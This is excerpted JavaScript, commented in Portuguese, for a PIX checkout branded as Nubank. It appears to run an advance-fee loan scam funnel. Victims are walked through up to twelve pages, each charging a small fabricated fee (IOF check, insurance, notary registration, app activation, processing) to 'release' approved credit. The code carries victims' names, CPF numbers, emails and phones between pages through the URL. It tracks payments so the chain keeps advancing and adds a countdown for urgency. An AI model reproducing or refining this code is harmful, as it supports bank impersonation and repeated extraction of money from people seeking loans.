...
/* ═══════════════════════════════════════════════════════════════════════════
   Checkout PIX Nubank — modal + geração via /api/pix (BlackCat) + polling /api/status.
...
var PIX_PRODUCTS = {
  ...
  up5: { price: 17.00, name: 'Ativação de Conta' },
  up6: { price: 17.02, name: 'Taxa de Registro do Contrato' },
  up7: { price: 14.06, name: 'Taxa - Limite Adicional de Crédito' },
  up8: { price: 14.06, name: 'Taxa de Processamento' },
  up9: { price: 11.99, name: 'Taxa de Ativação do Aplicativo' },
...
var PIX_MESSAGES = {
  ...
  up2: { emoji: '🔍', titulo: 'Confirme a verificação de IOF', sub: 'A taxa de verificação valida a apuração do imposto e libera o valor reservado na sua conta.' },
  up3: { emoji: '🛡️', titulo: 'Contrate o Seguro e libere seu crédito', sub: 'O Seguro Prestamista garante a liberação segura do valor. Pague a taxa única e o crédito é liberado via Pix.' },
  up4: { emoji: '🧾', titulo: 'Emita a nota fiscal e libere o valor', sub: 'A TENF formaliza a operação junto à Receita e é obrigatória pra liberar o crédito na sua conta.' },
  up5: { emoji: '✅', titulo: 'Ative sua conta agora', sub: 'A ativação libera o acesso à conta e o valor será creditado como saldo disponível.' },
  up6: { emoji: '📄', titulo: 'Registre seu contrato e libere o valor', sub: 'A Taxa de Registro formaliza e garante a validade legal do seu contrato em cartório, dando segurança jurídica pra liberação.' },
  up7: { emoji: '🎉', titulo: 'Desbloqueie o limite adicional aprovado', sub: 'Um valor extra foi liberado pra sua conta. Pague a taxa única e receba tudo via Pix.' },
  up8: { emoji: '⚙️', titulo: 'Confirme a taxa de processamento', sub: 'A taxa de processamento finaliza a análise e libera o crédito aprovado na sua conta.' },
  up9: { emoji: '📱', titulo: 'Ative seu aplicativo agora', sub: 'A tarifa de ativação libera o acesso ao app e o valor será reembolsado na sua conta digital.' },
  up10: { emoji: '💳', titulo: 'Pague a Taxa de Abertura de Crédito', sub: 'A TAC é cobrada pela instituição financeira pra formalizar a abertura da linha de crédito aprovada.' },
  up11: { emoji: '📊', titulo: 'Confirme a Consultoria Financeira', sub: 'A taxa de consultoria garante o acompanhamento especializado durante a liberação do seu crédito.' },
  up12: { emoji: '✔️', titulo: 'Última etapa: Processamento Administrativo', sub: 'A taxa de processamento finaliza a liberação do seu crédito junto ao setor administrativo.' },
};

// Próximo destino do funil por página. Mesma ordem do supersimcliente original
// (js/upsells-shared.js: upsellOrder=[1,4,5,6,7,9,10,11,12,8,2,3]), não sequencial.
// up3 é o último da cadeia e encerra (fica).
var NU_NEXT = {
  up1: '/up4',
  up4: '/up5',
  up5: '/up6',
...
// Identidade do comprador vinda na URL.
// O checkout de entrada devolve o cliente na query do upsell:
//   /up1?name=pedro%20maciel%20de%20sousa&document=08369727166&email=...&telephone=...
// Quem chega por aí NUNCA tem localStorage preenchido (o /01→/02 rodou em outro domínio, ou o
// lead nem passou pelo funil próprio): sem ler a query, o /api/pix caía no fallback e sorteava
// nome/CPF/email. A venda do upsell saía com identidade fake, sem casar com a venda de entrada.
var URL_IDENT_KEYS = {
  nome: ['name', 'nome', 'customer_name', 'nome_cliente', 'fullname'],
  cpf: ['document', 'cpf', 'doc', 'documento', 'customer_document'],
  email: ['email', 'e-mail', 'customer_email', 'mail'],
  phone: ['telephone', 'telefone', 'phone', 'celular', 'whatsapp', 'customer_phone'],
};

// "pedro maciel de sousa" -> "Pedro Maciel de Sousa": o checkout manda tudo minúsculo e é assim
// que aparece no extrato do gateway e na UTMify.
function _nuTitulo(nome) {
  var minusculas = { de: 1, da: 1, do: 1, das: 1, dos: 1, e: 1 };
  return String(nome).toLowerCase().split(/\s+/).filter(Boolean).map(function (p, i) {
    if (i > 0 && minusculas[p]) return p;
    return p.charAt(0).toUpperCase() + p.slice(1);
  }).join(' ');
}

function _nuIdentDaUrl() {
  var out = { nome: '', cpf: '', email: '', phone: '' };
  try {
    var p = new URLSearchParams(window.location.search);
    Object.keys(URL_IDENT_KEYS).forEach(function (campo) {
      var nomes = URL_IDENT_KEYS[campo];
      for (var i = 0; i < nomes.length; i++) {
        var v = p.get(nomes[i]);
        if (v && String(v).trim()) { out[campo] = String(v).trim(); return; }
      }
    });
  } catch (e) {}
  if (out.nome) out.nome = _nuTitulo(out.nome);
  out.cpf = out.cpf.replace(/\D/g, '');
  out.phone = out.phone.replace(/\D/g, '');
  if (out.email && out.email.indexOf('@') === -1) out.email = '';
  return out;
}

// Grava a identidade da URL no mesmo formato que o funil próprio usa, pra ela sobreviver aos
// upsells seguintes mesmo se algum link da cadeia perder a query.
function _nuPersistirIdent(id) {
  if (!id.nome && !id.cpf && !id.email && !id.phone) return;
  try {
    var du = {};
    try { du = JSON.parse(localStorage.getItem('dadosUsuario') || '{}') || {}; } catch (e) {}
    // CPF diferente do guardado = outro comprador nesse navegador: zera em vez de misturar o
    // nome de um com o documento de outro.
    var antigo = String(du.cpf || localStorage.getItem('cpfUsuario') || '').replace(/\D/g, '');
    if (id.cpf && antigo && antigo !== id.cpf) {
      du = {};
      ['nomeUsuario', 'cpfUsuario', 'name', 'cpf', 'email', 'telephone', 'telefone'].forEach(function (k) {
        try { localStorage.removeItem(k); } catch (e) {}
      });
    }
    if (id.nome) { du.nome = id.nome; localStorage.setItem('nomeUsuario', id.nome); }
    if (id.cpf) { du.cpf = id.cpf; localStorage.setItem('cpfUsuario', id.cpf); }
    if (id.email) localStorage.setItem('email', id.email);
    if (id.phone) localStorage.setItem('telephone', id.phone);
    localStorage.setItem('dadosUsuario', JSON.stringify(du));
  } catch (e) {}
}

var _NU_IDENT_URL = _nuIdentDaUrl();
_nuPersistirIdent(_NU_IDENT_URL);

// Cliente da venda: a URL é a verdade (é o comprador que acabou de pagar a entrada); o
// localStorage do funil próprio (/01→/02) fica de retaguarda campo a campo.
function _nuCliente() {
  ...
  return {
    nome: _NU_IDENT_URL.nome || nome,
    cpf: _NU_IDENT_URL.cpf || cpf,
    email: _NU_IDENT_URL.email || email,
    phone: _NU_IDENT_URL.phone || phone,
  };
}
...
// ── Estado da compra que SOBREVIVE ao navegador ────────────────────────────────────────────
// O avanco do funil dependia 100% da aba ficar aberta com o modal e o setInterval vivo. Na vida
// real o comprador sai pro app do banco, o celular descarta a aba de background, ele volta e cai
// no MESMO upsell: gera um segundo PIX do passo que ja pagou e o funil nunca avanca. Webhook nao
// cura isso (ele fala com o servidor, nao com a tela). A cura e guardar a transacao pendente e os
// passos ja pagos, e reconferir no gateway toda vez que a pagina abre ou volta pro foco.
var NU_LS_PEND = '_nu_pix_pend';    // { upKey, txnId, qr, ts }
var NU_LS_PAGOS = '_nu_pix_pagos';  // ["up1", "up4", ...]
var NU_REUSO_MS = 30 * 60 * 1000;   // QR pendente e reaproveitado por 30min em vez de gerar outro

function _nuPagosLer() {
  try { return JSON.parse(localStorage.getItem(NU_LS_PAGOS) || '[]') || []; } catch (e) { return []; }
}
function _nuMarcarPago(upKey) {
  try {
    var l = _nuPagosLer();
    if (l.indexOf(upKey) === -1) l.push(upKey);
    localStorage.setItem(NU_LS_PAGOS, JSON.stringify(l));
  } catch (e) {}
}
function _nuPendLer() {
  try { return JSON.parse(localStorage.getItem(NU_LS_PEND) || 'null'); } catch (e) { return null; }
}
function _nuPendGravar(upKey, txnId, qr) {
  try { localStorage.setItem(NU_LS_PEND, JSON.stringify({ upKey: upKey, txnId: txnId, qr: qr, ts: Date.now() })); } catch (e) {}
}
function _nuPendLimpar() { try { localStorage.removeItem(NU_LS_PEND); } catch (e) {} }

function _nuUpKeyDaUrl() {
  var m = window.location.pathname.match(/\/(up\d+)/);
  return m ? m[1] : '';
}

// Roda em toda carga de pagina de upsell: se o passo ja foi pago, segue a cadeia sem cobrar de
// novo; se ha PIX pendente, pergunta ao gateway antes de deixar o comprador gerar outro.
function _nuRetomar() {
  var atual = _nuUpKeyDaUrl();
  if (!atual) return;

  if (_nuPagosLer().indexOf(atual) !== -1) { _nuNext(atual); return; }

  var p = _nuPendLer();
  if (!p || !p.txnId) return;
  fetch('/api/status?id=' + encodeURIComponent(p.txnId))
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (!d || !d.paid) return;
      _nuMarcarPago(p.upKey);
      _nuPendLimpar();
      _nuNext(p.upKey);
    })
    .catch(function () {});
...
// Render do QR no modal. Serve tanto pro PIX recem-criado quanto pro pendente reaproveitado.
function _pixMostrarQr(upKey, txnId, brcode, amount) {
  ...
  document.getElementById('pix-amount-display').textContent =
    'R$ ' + Number(amount).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });

  try { var q = qrcode(0, 'M'); q.addData(brcode); q.make(); document.getElementById('pix-qr-img').src = q.createDataURL(5, 4); }
  catch (e) { document.getElementById('pix-qr-img').src = 'https://api.qrserver.com/v1/create-qr-code/?data=' + encodeURIComponent(brcode) + '&size=188x188&margin=6&bgcolor=ffffff'; }

  document.getElementById('pix-code').value = brcode;
  _pixCurrentTxn = txnId;
...
function _pixOpenModal(upKey) {
  ...
  // PIX pendente do MESMO passo e recente: mostra o mesmo QR. Gerar outro por reabrir o modal
  // enche o painel de cobrancas duplicadas do passo que o comprador ja esta pagando.
  var pend = _nuPendLer();
  if (pend && pend.upKey === upKey && pend.qr && (Date.now() - (pend.ts || 0)) < NU_REUSO_MS) {
    _pixMostrarQr(upKey, pend.txnId, pend.qr, PIX_PRODUCTS[upKey] ? PIX_PRODUCTS[upKey].price : 0);
    // Confere na hora: pode ter sido pago enquanto a aba estava fechada.
    fetch('/api/status?id=' + encodeURIComponent(pend.txnId))
      .then(function (r) { return r.json(); })
      .then(function (d) { if (d && d.paid) _pixConfirmado(); })
      .catch(function () {});
    return;
  }
  ...
  fetch('/api/pix', {
    ...
    .then(function (data) {
      ...
      _nuPendGravar(upKey, data.txnId, data.qrcode);
      _pixMostrarQr(upKey, data.txnId, data.qrcode, data.amount);
    })
...
function _pixStartTimer() {
  ...
  _pixTimerInterval = setInterval(function () {
    ...
    // Timer zerado e só urgência de copy: o BR Code vale 1 dia e muito comprador paga depois dos
    // 15min. Matar o polling aqui era perder a confirmação (e o avanço do funil) de uma venda paga.
    if (_pixTimerSecs <= 0) { clearInterval(_pixTimerInterval); el.textContent = '⏳ Aguardando pagamento'; }
  }, 1000);
}
...
function _pixConfirmado() {
  clearInterval(_pixPollInterval);
  clearInterval(_pixTimerInterval);
  _nuMarcarPago(_pixCurrentUpKey);
  _nuPendLimpar();
  document.getElementById('pix-content').style.display = 'none';
...
// Celular em background estrangula setInterval e chega a descartar a aba inteira. Toda volta ao
// foco (e todo restore de bfcache) reconfere o pagamento em vez de confiar no timer.
function _nuConferirAoVoltar() {
  if (document.visibilityState === 'hidden') return;
  if (_pixCurrentTxn) {
    fetch('/api/status?id=' + encodeURIComponent(_pixCurrentTxn))
      .then(function (r) { return r.json(); })
      .then(function (d) { if (d && d.paid) _pixConfirmado(); })
      .catch(function () {});
  } else {
...
document.addEventListener('visibilitychange', _nuConferirAoVoltar);
window.addEventListener('pageshow', _nuConferirAoVoltar);
_nuRetomar();
